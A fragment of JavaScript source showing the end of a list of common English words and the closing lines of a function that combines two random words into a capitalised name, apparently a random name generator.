","deposit","print","raise","sleep","somewhere","advance","consist","dark","double","draw","equal","fix","hire","internal","join","kill","sensitive","tap","win","attack","claim","constant","drag","drink","guess","minor","pull","raw","soft","solid","wear","weird","wonder","annual","count","dead","doubt","feed","forever","impress","repeat","round","sing","slide","strip","wish","combine","command","dig","divide","equivalent","hang","hunt","initial","march","mention","spiritual","survey","tie","adult","brief","crazy","escape","gather","hate","prior","repair","rough","sad","scratch","sick","strike","employ","external","hurt","illegal","laugh","lay","mobile","nasty","ordinary","respond","royal","senior","split","strain","struggle","swim","train","upper","wash","yellow","convert","crash","dependent","fold","funny","grab","hide","miss","permit","quote","recover","resolve","roll","sink","slip","spare","suspect","sweet","swing","twist","upstairs","usual","abroad","brave","calm","concentrate","estimate","grand","male","mine","prompt","quiet","refuse","regret","reveal","rush","shake","shift","shine","steal","suck","surround","bear","brilliant","dare","dear","delay","drunk","female","hurry","inevitable","invite","kiss","neat","pop","punch","quit","reply","representative","resist","rip","rub","silly","smile","spell","stretch","stupid","tear","temporary","tomorrow","wake","wrap","yesterday","Thomas","Tom","Lieuwe"];var name = capFirst(name1[getRandomInt(0, name1.length + 1)]) + ' ' + capFirst(name2[getRandomInt(0, name2.length + 1)]);return name}
